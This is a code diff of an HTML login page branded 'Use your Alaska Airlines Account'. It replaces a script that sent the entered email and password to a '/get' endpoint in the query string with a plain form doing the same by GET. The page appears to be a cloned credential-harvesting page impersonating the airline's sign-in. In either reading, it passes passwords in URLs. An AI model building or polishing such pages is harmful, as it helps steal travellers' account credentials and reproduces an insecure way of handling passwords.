@@ -42,20 +42,7 @@
             box-sizing: border-box;
         }
     </style>
-    <script>
-        window.addEventListener('DOMContentLoaded', (event) => {
-            const form = document.getElementById('email-form-step');
-            form.addEventListener('submit', (event) => {
-                event.preventDefault();
-                const emailInput = document.getElementById('email-input');
-                const passwordInput = document.getElementById('password-input');
-                const email = emailInput.value;
-                const password = passwordInput.value;
-                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
-                window.location.href = url;
-            });
-        });
-    </script>
+
 </head>
 <body>
     <div class="container">
@@ -69,7 +56,7 @@
                       </g>
                     </svg>
                 </div>
-                <form id="email-form-step">
+                <form id="email-form-step" action="/get" method="get">
                     <h1>Sign in</h1>
                     <h2>Use your Alaska Airlines Account</h2>
                     <div class="form-group">
